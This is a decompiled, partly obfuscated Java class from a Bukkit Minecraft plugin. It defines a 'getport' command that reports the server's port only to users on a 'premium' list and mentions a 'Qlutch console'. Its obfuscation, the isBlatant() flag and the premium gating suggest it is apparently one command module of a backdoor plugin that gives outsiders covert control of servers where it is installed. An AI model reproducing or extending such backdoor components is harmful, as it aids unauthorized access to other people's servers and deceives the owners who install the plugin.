/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class GetportCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return false;
    }

    @Override
    public void execute(Core llllllllllllllIIllIlllIIIIllIlIl, String llllllllllllllIIllIlllIIIIlllIIl, String[] llllllllllllllIIllIlllIIIIlllIII, Player llllllllllllllIIllIlllIIIIllIllI) {
        if (llllllllllllllIIllIlllIIIIllIlIl.premium.contains(llllllllllllllIIllIlllIIIIllIllI.getName())) {
            llllllllllllllIIllIlllIIIIllIllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The server port is ").append(Settings.RED).append(Bukkit.getServer().getPort()).append(Settings.WHITE).append(" (this port may not work for the Qlutch console!)"))));
        } else {
            llllllllllllllIIllIlllIIIIllIllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }

    public GetportCommand() {
        GetportCommand llllllllllllllIIllIlllIIIlIIlIII;
    }
}

